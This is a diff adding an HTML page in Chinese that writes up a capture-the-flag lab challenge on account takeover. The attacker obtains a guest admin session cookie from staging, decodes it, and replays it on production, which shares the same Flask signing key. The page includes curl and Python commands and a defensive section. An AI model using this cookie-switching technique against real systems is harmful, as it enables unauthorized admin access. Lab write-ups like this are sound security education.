@@ -1,0 +1,63 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>09 · 0-Click Account Takeover via Cookie Switching —— 压轴：两个错误叠加成的接管 · Wiz Masterclass 通关复盘</title><link rel="stylesheet" href="style.css">
+</head><body><header><nav>
+<a href="index.html">← 总览</a><span class="crumb">Wiz Bug Bounty Masterclass · 9/9 · GLM Agent 协作复盘</span>
+<div class="pager"><a href="wu-08.html">← 堆转储暴露</a></div></nav></header>
+<main><article><h1>09 · 0-Click Account Takeover via Cookie Switching —— 压轴：两个错误叠加成的接管</h1>
+<blockquote><p>系列第 9 题 · 对应真实事件：跨环境会话管理不当导致无需用户交互的完整账户接管<br>（原赏金 $20,000）· 我的净耗时：约 15 分钟</p></blockquote>
+<h2>题面</h2>
+<blockquote><p>You've discovered a router reseller company running both staging and<br>production environments. But are they really separate?<br>Your mission: explore both environments, understand how sessions are handled<br>and break into production.</p></blockquote>
+<p>靶场地址：<strong>两套环境</strong>——<code>https://stage.&lt;REDACTED_DOMAIN&gt;/</code> 与<br><code>https://prod.&lt;REDACTED_DOMAIN&gt;/</code></p>
+<h2>我的判断路径</h2>
+<p>"staging 和 production 真的是隔离的吗？"——这类题的检验清单：</p>
+<ol><li>两套环境的差异面（路由、功能、配置）</li><li>会话载体是什么（cookie？token？），由谁签发、谁验证</li><li><strong>一方的凭据拿到另一方是否依然有效</strong></li></ol>
+<p>前置侦察（第 2 题建立的 CT 日志战场地图）早就显示这两个子域名同属一套基础设施，<br>所以第 3 步是我开局的主假设。</p>
+<h2>过程</h2>
+<h3>1. 双环境差异侦察</h3>
+<table><thead><tr><th></th><th>staging</th><th>production</th></tr></thead><tbody><td>首页标记</td><td>醒目的 "STAGING ENVIRONMENT" 横幅</td><td>无</td></tr><tr><td>登录入口</td><td><code>/login</code> + <strong><code>/guest-login</code></strong>（额外）</td><td>仅 <code>/login</code></td></tr><tr><td>未登录访问 <code>/dashboard</code></td><td>302 → <code>/login</code></td><td>302 → <code>/login</code></td></tr></tbody></table>
+<p>staging 独有的 <code>/guest-login</code> 就是入口。</p>
+<h3>2. 一个 GET 白拿的会话</h3>
+<pre class="code"><code>GET https://stage.&lt;REDACTED_DOMAIN&gt;/guest-login
+
+→ HTTP 302 (Location: /dashboard)
+  Set-Cookie: session=&lt;REDACTED_TOKEN&gt;; HttpOnly; Path=/</code></pre>
+<p>不需要任何凭据，一个 GET 请求就拿到了带完整会话的 cookie。<br>格式是 Flask 框架经典的 <code>payload.timestamp.signature</code> 三段式签名 cookie，<br>首部带 <code>.</code> 说明 payload 经过了 zlib 压缩。</p>
+<h3>3. 解码会话：第一个错误浮出水面</h3>
+<pre class="code bash"><code># base64url 解码 + zlib 解压（Python 一行）
+python3 -c "import base64,zlib;print(zlib.decompress(base64.urlsafe_b64decode('&lt;payload&gt;')).decode())"</code></pre>
+<pre class="code json"><code>{"environment": "staging", "name": "Guest User", "role": "admin", "user": "guest"}</code></pre>
+<p><strong>staging 的 guest 账号，角色是 <code>admin</code>。</strong> 测试环境图省事给游客发管理员权限，<br>这是第一个错误。</p>
+<h3>4. Cookie 切换：第二个错误完成接管</h3>
+<p>现在验证我的主假设——把这个 staging 签发的 cookie 原样带到 production：</p>
+<pre class="code bash"><code>curl -H "Cookie: session=&lt;REDACTED_TOKEN&gt;" \
+     https://prod.&lt;REDACTED_DOMAIN&gt;/dashboard
+
+→ HTTP 200
+  "Welcome, Guest User!" + ADMIN 徽章 + flag（&lt;REDACTED&gt;）</code></pre>
+<p><strong>production 完整接受了 staging 签发的管理员会话。</strong> 两个环境共用同一个<br>Flask SECRET_KEY，签名互相认可——会话隔离形同虚设。这是第二个错误。</p>
+<h3>为什么叫"0-Click"</h3>
+<p>被接管的一方（production 里的真实用户/管理员）<strong>不需要点任何东西、不需要任何操作</strong>：<br>攻击者在 staging 自助"铸造"一枚 admin 会话，拿到 production 就是管理员。<br>受害者全程无感知，连被攻击的痕迹都没有。</p>
+<h2>漏洞结构（复盘文章的核心图景）</h2>
+<pre class="code"><code>错误①：staging 的 guest 被赋予 role=admin     （权限设计错误）
+错误②：两环境共享会话签名密钥                 （环境隔离形同虚设）
+              ↓ 叠加
+staging 的一个 GET 请求 = production 的管理员会话</code></pre>
+<p>单独看每个错误都"只是个配置问题"，叠加起来是 $20,000 的完整账户接管——<br>真实世界的严重漏洞几乎都是这样<strong>多个小错误的组合</strong>，而不是单点大坑。</p>
+<h2>关键命令（脱敏后结构可复用）</h2>
+<pre class="code bash"><code>STAGE="https://stage.&lt;REDACTED_DOMAIN&gt;"; PROD="https://prod.&lt;REDACTED_DOMAIN&gt;"
+
+curl -D - -o /dev/null "$STAGE/guest-login"          # 白拿会话（看 Set-Cookie）
+python3 -c "…"                                        # 解码 cookie 看角色声明
+curl -H "Cookie: session=&lt;REDACTED_TOKEN&gt;" "$PROD/dashboard"   # 切换即接管</code></pre>
+<h2>失败与弯路</h2>
+<p>无返工。前置情报（CT 日志里的双子域名）+ 侦察清单让路径几乎是直线。<br>这也验证了方法论的价值：<strong>压轴题反而是后半程最快的三题之一</strong>——<br>因为到第 9 题时，"先看什么、后试什么"已经不需要思考。</p>
+<h2>防御视角（如果我是蓝队）</h2>
+<ol><li><strong>不同环境必须使用不同的会话签名密钥</strong>——staging 的钥匙开不了 production 的锁，</li></ol>
+<p>   这应该是环境初始化的硬性检查项</p>
+<ol><li>测试环境也不该有"guest = admin"的捷径；测试需要高权限就显式登录高权限账号</li><li>会话声明里的 <code>environment</code> 字段应该在服务端强制校验，而不是只写进 cookie 当摆设</li><li>Flask/Django 类"签名不加密"的会话机制要牢记：<strong>内容对任何人可读，仅防篡改</strong>；</li></ol>
+<p>   密钥一旦共享或泄露，伪造即合法</p>
+<h2>证据</h2>
+<ul><li><code>evidence/09-1-flag-submitted.png</code> —— 提交成功页面（全系列最后一题，9/9）</li></ul></article></main>
+<footer>基于 GLM 驱动的 Agent 协作完成（2026-10-24）· <a href="https://www.wiz.io/bug-bounty-masterclass/certificate/43a82202-6aaa-4a0b-b43a-118f380d8af1" target="_blank" rel="noopener">官方证书</a> · 全部敏感内容已脱敏（见仓库 REDACTION.md）</footer>
+</body></html>
